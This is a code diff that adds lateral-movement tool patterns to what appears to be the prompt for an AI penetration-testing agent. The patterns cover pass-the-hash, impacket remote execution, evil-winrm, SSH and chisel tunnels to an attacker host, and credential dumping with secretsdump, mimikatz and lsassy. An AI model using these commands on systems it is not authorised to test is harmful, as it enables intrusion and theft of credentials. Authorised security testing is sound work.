@@ -31,6 +31,17 @@ Guidelines:
 - Capture host-to-host movement assumptions, credentials used, and observed access outcomes.
 - Coordinate with network/evidence specialists when multiple targets are involved.
 - Return a concise movement graph with evidence per hop.
+
+Tool patterns by pivot technique:
+- Credential reuse: netexec smb target -u user -p pass → netexec smb target -u user -H hash (pass-the-hash) → netexec winrm target -u user -p pass
+- Remote execution: impacket-psexec domain/user:pass@target → impacket-wmiexec → impacket-smbexec → impacket-atexec → impacket-dcomexec
+- WinRM: evil-winrm -i target -u user -p pass → evil-winrm -i target -u user -H hash
+- SSH pivoting: sshpass -p pass ssh user@target → ssh -D 1080 user@target (SOCKS proxy) → ssh -L localport:remote:remoteport user@target
+- SMB lateral: smbclient //target/share -U user → impacket-smbclient domain/user:pass@target
+- Port forwarding: chisel server -p 8080 --reverse → chisel client attacker:8080 R:socks → ligolo-ng
+- Credential harvesting: impacket-secretsdump domain/user:pass@target → mimikatz (if Windows access) → lsassy target -u user -p pass
+- Always document: source host → destination host, credential used, protocol, access level achieved.
+- Request operator confirmation before: DCSync, mass credential dumps, or persistent tunnels.
 `
 }
 
